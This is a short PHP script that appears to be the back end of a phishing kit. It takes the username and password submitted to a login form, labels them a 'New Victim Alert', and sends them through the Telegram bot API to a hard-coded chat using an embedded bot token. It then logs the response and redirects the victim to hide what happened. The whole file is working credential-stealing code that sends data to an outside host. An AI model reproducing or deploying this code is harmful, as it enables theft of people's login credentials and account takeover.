<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Bot Token
    $chat_id = "1559369377"; // Chat ID

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $message = "🔥 New Victim Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message)."&parse_mode=HTML";

    // Use cURL 💪
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    curl_close($ch);

    // Debug Log 🔥
    file_put_contents("log.txt", $response . "\n", FILE_APPEND);

    header("Location: index.html"); // Redirect After Submission
    exit();
}
?>
